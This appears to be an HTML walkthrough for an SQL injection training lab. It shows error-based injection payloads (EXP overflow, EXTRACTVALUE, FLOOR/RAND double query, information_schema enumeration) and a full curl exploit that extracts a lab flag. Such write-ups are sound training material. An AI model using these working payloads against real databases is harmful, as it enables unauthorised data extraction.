<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the IP Address field.
    A MySQL syntax error confirms the injection point.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#039;&#039;&#039;&#039;&#039; at line 1
    </div>
</div>

<h4>Step 2: Understanding EXP() BIGINT Overflow (MySQL 5.5.x)</h4>
<p>
    On <strong>MySQL 5.5.x through approximately 5.5.52</strong>, the <code>EXP()</code>
    function can be abused for error-based extraction. The technique works because:
</p>
<ol>
    <li><code>~0</code> is the bitwise NOT of 0, which equals <code>18446744073709551615</code> (max unsigned BIGINT).</li>
    <li><code>EXP(710)</code> overflows, causing a <strong>DOUBLE value out of range</strong> error.</li>
    <li>By nesting a subquery inside: <code>EXP(~(SELECT * FROM (SELECT ...) x))</code>, the error message leaks the subquery result.</li>
</ol>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. EXP Overflow (MySQL 5.5.x Only)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e, (SELECT setting_value FROM config WHERE setting_name='master_key'), 0x7e)) x)) -- -
    </div>
</div>

<p>
    <strong>Note:</strong> On MariaDB (this lab), the EXP overflow produces:
    <code>DOUBLE value is out of range in 'exp(~(select #2))'</code>
    but does <strong>not</strong> leak the data. The overflow behavior that echoed
    data back was patched in MySQL 5.6+ and never existed in MariaDB.
    Use EXTRACTVALUE or FLOOR/RAND instead.
</p>

<h4>Step 3: Reliable Alternative. EXTRACTVALUE</h4>
<p>
    Since this lab runs on MariaDB 11.x, use <code>EXTRACTVALUE()</code> as a reliable
    error-based technique:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. EXTRACTVALUE (Reliable)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT setting_value FROM config WHERE setting_name='master_key'))) -- -
    </div>
</div>

<p>
    The error message will show: <code>XPATH syntax error: '~FLAG{3xp_b1g1nt_0v3rfl0w}'</code>
    (confirmed on MariaDB 11.x).
</p>

<h4>Step 4: Reliable Alternative. FLOOR/RAND/GROUP BY</h4>
<p>
    Another reliable technique that works across all MySQL/MariaDB versions:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Double Query (Reliable)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT setting_value FROM config WHERE setting_name='master_key'), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.columns GROUP BY x) a) -- -
    </div>
</div>

<p>
    The error will show: <code>Duplicate entry 'FLAG{3xp_b1g1nt_0v3rfl0w}:1' for key 'group_key'</code>.
</p>

<h4>Step 5: Enumerate. Discovering the Config Table</h4>
<p>
    If you did not know the table name, you could enumerate it first:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Enumerate Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Tables: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br>
        <span class="prompt">Error: </span>XPATH syntax error: '~config,logs'<br><br>
        <span class="prompt">Columns: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='config'))) -- -<br>
        <span class="prompt">Error: </span>XPATH syntax error: '~id,setting_name,setting_value'
    </div>
</div>

<h4>Step 6: Submit the Master Key</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{3xp_b1g1nt_0v3rfl0w}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab7" \<br> --data-urlencode "ip=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT setting_value FROM config WHERE setting_name='master_key'))) -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The EXP() BIGINT overflow technique was a powerful
    error-based method on MySQL 5.5.x, but it has been patched in newer versions.
    Real-world penetration testers need to know <strong>multiple error-based
    techniques</strong> and fall back to alternatives (EXTRACTVALUE, FLOOR/RAND,
    UPDATEXML) when one method does not work. Always test your database version first.
</div>
